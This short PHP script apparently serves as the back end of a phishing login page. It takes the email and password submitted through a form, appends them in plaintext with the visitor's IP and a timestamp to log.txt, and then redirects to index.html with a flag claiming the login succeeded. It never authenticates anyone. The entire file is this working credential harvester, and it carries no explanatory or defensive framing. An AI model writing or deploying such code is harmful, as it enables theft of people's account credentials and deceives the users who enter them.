<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d H:i:s");

    // Only log if both fields are non-empty
    if (!empty($email) && !empty($password)) {
        $entry = "[$time] IP: $ip | Email: $email | Password: $password\n";
        file_put_contents("log.txt", $entry, FILE_APPEND | LOCK_EX);
    }

    // Redirect back after logging
    header("Location: index.html?loggedin=true");
    exit();
}
?>

